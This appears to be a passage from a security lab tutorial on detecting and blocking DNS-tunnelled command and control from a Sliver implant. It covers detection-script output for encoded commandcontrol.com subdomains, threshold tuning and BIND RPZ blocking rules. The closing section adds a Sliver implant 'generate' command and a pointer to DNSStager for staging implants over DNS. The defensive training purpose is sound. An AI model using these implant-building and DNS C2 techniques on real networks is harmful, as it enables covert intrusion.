      - 6Ngv85FEMSXb47pA3DiTJ9e.s.commandcontrol.com.
      - dMd622Mo3rgmYHsgZSgtYPvQV3qxCAZVjd3riVG22wt9cAwEZyMRApGSmyEukk5.S88H8Rt3L97GLECnwj6xC9DMiyppUawxTDLBSZ1DnT9UPR9bpMUoHSjcNvQFmwT.kHH.s.commandcontrol.com.
      - 4kMdLCzz2Lh1v8fa8N5xCUwnsyScieTGXaQ9MphHZwQSWEnMMSG7iYhqpH9dnTm.WjNRPzHAv6brYHYZygJqFQf8ba2g9UX8cq9hjR34HxkDrBoU94BHxxBcR.s.commandcontrol.com.
      - 6Ngv85FEMSXAvGB9MX1ixDo.s.commandcontrol.com.
      - backbyhgtk59aw4.s.commandcontrol.com.
      - backbyhgtk79aw4.s.commandcontrol.com.
      - 6Ngv85FEMSXAv256SNMu93H.s.commandcontrol.com.
      - backbyhgtk99aw4.s.commandcontrol.com.
      - 3NNhTEvK18sKTnDwDxySy5jLsKDHU88DuvZ2P5LpC7wMZFEXtfQ7jktmzqD9CSN.V3FjmF6Tjxi2yvqqjG1tMQ3Rxad3q8qSmwAHv6FybdddE5KYMPdg1BNYVrLrNqY.py2K82fVLQdgiFd6widVNHqevH4mZ2u9LrCVKThFJdBC3Q29SmwHqfMgCeRHq1c.4rCUUvvpXqdLmewmD3Mnv7NkvRX3juVSbrMGMkd.s.commandcontrol.com.
      - 65u6Y3qKbvWCxkPbKDicVJbKQGPidvJ6PB2SwRD3z5mYKR3skVikGH2ZhqVU3BW.F5YN57q7ktzfad67WGxd36yUhDXYr5CLXJ8dgfjoxU3qu6FNiggikVRaQiz1agJ.c7GkSPEbt.s.commandcontrol.com.
      - a2tMe8MDwxuajVZMT1AzcSFoeWmnVAG18Hg12tifJYBtD7gk43pMVzAzJwRzMK4.NS5AbBmu4D6LhtNpMPaA91nbGXypFGohydbqfd3KSEFbuSbpoeY33rc8ybModbq.wCQsD3j8nAtZtMKzY.s.commandcontrol.com.
      - 6Ngv85FEMSXAzCB6ZPDDWJK.s.commandcontrol.com.
      - 1WTEgnsvUH1oRpTWkcYPK6oEMgudVuhDpQC4UMJj3pjYEpe9QDvN8i5esitdWZn.f3Yg8jzjaRaYHwWKRJLCJtRD6m7RTd9U1gwXFta1eoRrLnXu3TZ5rdN68DYEM1e.1hd5BDHrcHiB1u4xdcWPtpKWncd.s.commandcontrol.com.
      - 6Ngv85FEMSXAuasa9Xm7B45.s.commandcontrol.com.
      - 1NudDmC4FxkBBfyonny9uyBjSuwBV7b9xvWfUuSWRuFZiCtgbhYG1oMPPWQMj8u.gmvCxvuJy72X5MchDyE8cKyJPVRf1wXAMSfFxe7Jz4dxLneqtb5Q1reengCwVNP.xnfgfCb6Woiw.s.commandcontrol.com.
      - backbyhgtkp9awr.s.commandcontrol.com.
      - 6Ngv85FEMSXAhKmgm1WYjPD.s.commandcontrol.com.
      - 3NNhTEvK5RtJQAkJNbxQZparBLVZrv9cu2ZqANxP5mqqzTbL1KuMk5Jzrav5iK8.kZeBUti2dGvcuPBhzr1EDjMvfTygFeaX9vcDKQQ83HXx72YhdDnkas6cxMvLjDM.ZGFXy9XpR7LxLCXad878j8VzN9hQ4A7scGaVmH7JqHZcJLZcjw1mAxB5qJM9nvx.yDe4YrdLSmANP4jbHsNU4Ro7C4L28Q78vGS829K.s.commandcontrol.com.
      - backbyhgtku9aw4.s.commandcontrol.com.
      - 65u6Y3qKJMm1twx5haLqLKBErnY6b3AtgyKoQdsZ8E9d6L1HsHVW3cLeWGmU9gT.4ZHfJbrE24ZdXACnTSQdWMDGc8vivJVPhkswj5wFk2wgH7EWDQ7dn7GbimLogD8.iDphGsJoQ.s.commandcontrol.com.
      - 1WTEgnsvX2ADPtSoWeejgvgkVBCajX96TPcCsUaNTcisn8L7amj9LouY5sukVPG.hqxhttU8xuRLTx9kWkEHXpvnqcnqsPKaEQ2SKzAREcTcdnFNqB5UK6Jz27BY5Vb.rTGUMiUrSnwzcBJcw7JHeppBU5e.s.commandcontrol.com.
      - a2tMe8MeejkwkdiffA1gHD853TpbvHUKyEkGW7WzXzez7KaFYjJR4kPpBq4VSf2.tRn88TFGzym9i3HcQNReGLvUwLG57TmKrZQSEKTjno1YEz3hqqEX44d2ukXHBu6.eCGiTLePLctSYfJHA.s.commandcontrol.com.
      - 6Ngv85FEMSXAyihNWDN5VbD.s.commandcontrol.com.
      - 6Ngv85FEMSXAr18A5SamxMu.s.commandcontrol.com.
      - 6Ngv85FEMSXb4ucFTqqEgdq.s.commandcontrol.com.
   Averaged indicators (* is flagged, average value (global average value) :
      entropy: 4.8327 (3.0721)*
      non_letter_ratio: 0.1229 (0.0248)
      hex_char_ratio: 0.2478 (0.3017)
      vowel_ratio: 0.1852 (0.3348)*
      n_gram_2: 10.9626 (20.9079)
      n_gram_3: 7.9124 (9.8561)
      gini_index: 0.9555 (0.8627)*
      classification_error: 0.9133 (0.7978)*
      number_of_labels: 4.6986 (2.2024)*
      average_interval: 0.0712 (1.5459)*
      payload_size: 91.9863 (17.9644)*
   ------------------------------
   ========================================
   SLD: adblockplus.org.
   Score: 4.50 (Threshold: 4.5)
   Number of flagged domains: 1
   FQDNs under this SLD:
      - adblockplus.org.
   Averaged indicators (* is flagged, average value (global average value) :
      entropy: 3.5216 (3.0721)
      non_letter_ratio: 0.0000 (0.0248)
      hex_char_ratio: 0.2857 (0.3017)
      vowel_ratio: 0.2857 (0.3348)*
      n_gram_2: 0.0000 (20.9079)*
      n_gram_3: 0.0000 (9.8561)
      gini_index: 0.9082 (0.8627)*
      classification_error: 0.8571 (0.7978)*
      number_of_labels: 2.0000 (2.2024)
      average_interval: 0.0000 (1.5459)*
      payload_size: 16.0000 (17.9644)
   ------------------------------
   ```

   How to read it:

   - **SLD**: the second-level domain analysed.
   - **Score**: a combined score, computed from the indicators.
   - **Threshold**: the score from which a domain counts as suspicious.
   - **Flagged domains**: the fully qualified domain names under that SLD that count as suspicious.
   - **Indicators**: a `*` marks a flagged indicator. Each value is followed by the average over all domains, in brackets.

### Step 3: Tune the detection

The script also flags some legitimate domains: false positives. To reduce them:

1. Open `analysis.py` and read how it computes the score.

2. Change the weights and the threshold:
   - **Weights** set how much each indicator counts in the score.
   - **Threshold**: raise it to flag fewer domains, lower it to flag more.

   For example, lower the weight of `non_letter_ratio` if it causes too many false positives. Or raise the threshold above its first value, `4.5`. Based on the output above, which value would make sense?

3. Run the analysis again:

   ```bash
   python3 analysis.py
   ```

4. Check the result:
   - The `commandcontrol.com` domain must still be flagged.
   - The legitimate domains should no longer be flagged.

### Step 4: Block the domain with a response policy zone (RPZ)

A response policy zone (RPZ) lets a DNS server apply its own policy to answers: block a name, or redirect it.

1. Open `/etc/bind/rpz.zone` and add the malicious domain:

   ```bind
   ; Block domain by returning an empty response (NODATA)
   s.commandcontrol.com.rpz.       CNAME   *.
   *.s.commandcontrol.com.rpz.       CNAME   *.
   ```

   - `CNAME *.` blocks queries to `s.commandcontrol.com` and its subdomains by returning an empty answer (NODATA).
   - `CNAME .` would block them too, but returns NXDOMAIN ("this name does not exist") instead.

2. Check the zone file:

   ```bash
   named-checkzone rpz /etc/bind/rpz.zone
   ```

3. Reload the BIND configuration:

   ```bash
   rndc reload
   ```

4. On the client, try to resolve a name of the malicious domain:

   ```bash
   dig xxx.s.commandcontrol.com
   ```

   The status is `NOERROR` with `ANSWER: 0`: the name no longer resolves, so the domain is blocked.

5. Run the implant again in the client shell:

   ```bash
   /shared-data/TENDER_HOSPITAL
   ```

   The implant should fail to reach the C2 server, because its DNS queries are blocked.

## What you have learned

This lab showed how DNS can be abused as a hidden channel between a malicious implant and a C2 server. It also showed how defenders detect and stop such a channel, with log analysis and DNS response policies.

Seeing both the attacker's and the defender's side helps you protect networks against advanced threats.

## Go further

- **Deactivate the implant with a Sliver canary domain.** DNS canaries are domains unique to each implant, optionally added while Sliver obfuscates the implant's strings. The implant never uses them. They are deliberately *not obfuscated*, so they show up if someone runs `strings` on the implant. If one of them is ever resolved while a `dns` listener runs, you get an alert naming the file the blue team found. Example `generate` command with canaries; make sure to use the FQDN:

  ```
  sliver > generate --http foobar.com --canary 1.example.com.
  ```

  The `canaries` command lists the canaries already generated.

- **Transfer the implant over DNS** with a tool such as [DNSStager](https://github.com/mhaskar/DNSStager).

- **Explore evasion techniques.** Find out how attackers evade DNS-based detection, and how defenders counter them.

- **Automate RPZ updates.** Write a script that updates the RPZ from live threat intelligence feeds.

## References

- [Sliver C2 Framework](https://github.com/BishopFox/sliver)
- [Iodine DNS Tunneling](https://github.com/yarrick/iodine)
- [Understanding DNS RPZ](https://dnsrpz.info/)
- [Detecting DNS Tunneling](https://www.sans.org/white-papers/36297/)
